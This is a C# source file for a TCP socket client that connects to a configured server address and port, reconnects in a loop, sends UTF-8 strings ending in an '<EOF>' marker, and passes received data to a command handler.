using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Client.Client
{
    public class SocketClient
    {
        public static bool bShouldRun = true;
        private Socket serverSocket;

        public Socket GetServerSocket()
        {
            return serverSocket;
        }

        public bool SendUTF8(string szCMD, bool sendEOF = true)
        {
            try
            {
                string finalCMD = szCMD;
                if (sendEOF)
                    finalCMD += "<EOF>";
                serverSocket.Send(Encoding.UTF8.GetBytes(finalCMD));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
            return true;
        }

        public void ExecuteClient()
        {
            while (bShouldRun)
            {
                try
                {
                    // Connect to server

                    IPAddress ipAddress;
                    if (User.Config.szIPAddress == "0")
                    {
                        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                        ipAddress = ipHost.AddressList[0];
                    }
                    else
                    {
                        ipAddress = IPAddress.Parse(User.Config.szIPAddress);
                    }

                    // TCP/IP Socket.
                    serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    // Connect to server.
                    IPEndPoint localEndPoint = new(ipAddress, User.Config.iPortNumber);
                    GetServerSocket().Connect(localEndPoint);

                    if (GetServerSocket().Connected)
                    {
                        Console.WriteLine("ExecuteClient: Socket connected successfully");
                        CommandHandler.SendName();
                    }

                    try
                    {
                        while (GetServerSocket().Connected)
                        {
                            // Data buffer
                            byte[] messageReceived = new byte[User.Config.iSocketBuffer];
                            int byteRecv = serverSocket.Receive(messageReceived);
                            if (byteRecv == 0)
                            {
                                Console.WriteLine("ExecuteClient: No bytes received, disconnecting.");
                                GetServerSocket().Disconnect(true);
                            }
                            CommandHandler.ParseData(Encoding.UTF8.GetString(messageReceived, 0, byteRecv));
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("ExecuteClient: " + e.Message);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("ExecuteClient: " + e.Message);
                }
            }
        }
    }
}
